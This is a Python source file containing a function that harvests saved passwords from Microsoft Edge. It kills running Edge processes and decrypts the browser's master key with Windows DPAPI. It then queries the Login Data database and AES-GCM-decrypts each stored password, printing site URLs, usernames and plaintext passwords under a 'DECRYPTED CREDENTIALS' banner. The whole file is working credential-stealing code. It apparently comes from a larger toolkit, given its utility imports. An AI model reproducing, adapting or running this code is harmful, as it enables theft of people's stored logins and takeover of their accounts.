import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from utils.ansiColors import BOLD_RED, BOLD_GREEN, GRAY, RESET

def getPasswords():
    try:
        if os.system("tasklist | findstr msedge.exe") == 0:
            os.system("taskkill /F /IM msedge.exe")
            os.system('cls' if os.name == 'nt' else 'clear')

        dbPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
        keyPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"

        if not os.path.exists(dbPath) or not os.path.exists(keyPath):
            print(f"{BOLD_RED}'Login Data' or 'Local State' file not found.{RESET}")
            return

        with open(keyPath, 'r') as file:
            localState = json.load(file)
        encryptedKey = base64.b64decode(localState['os_crypt']['encrypted_key'])[5:]
        decryptedKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]

        conn = sqlite3.connect(dbPath)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        print("=======================================")
        print("      ** DECRYPTED CREDENTIALS **      ")
        print("=======================================")

        outputs = []

        for originUrl, username, encryptedPassword in cursor.fetchall():
            if not username or not encryptedPassword:
                continue

            try:
                iv = encryptedPassword[3:15]
                cipher = AES.new(decryptedKey, AES.MODE_GCM, iv)
                decryptedPassword = cipher.decrypt(encryptedPassword[15:-16]).decode()

                outputs.append(f"{BOLD_GREEN}► {GRAY}{originUrl}")
                outputs.append(f"{BOLD_GREEN}Username :{RESET} {username}")
                outputs.append(f"{BOLD_GREEN}Password :{RESET} {decryptedPassword}")
                outputs.append("")
            
            except Exception as e:
                outputs.append(f"{BOLD_RED}Error decrypting password for {originUrl}: {e}{RESET}")

        for line in outputs[:-1]:
            print(line)

        conn.close()
    except Exception as e:
        print(f"{BOLD_RED}General error: {e}{RESET}")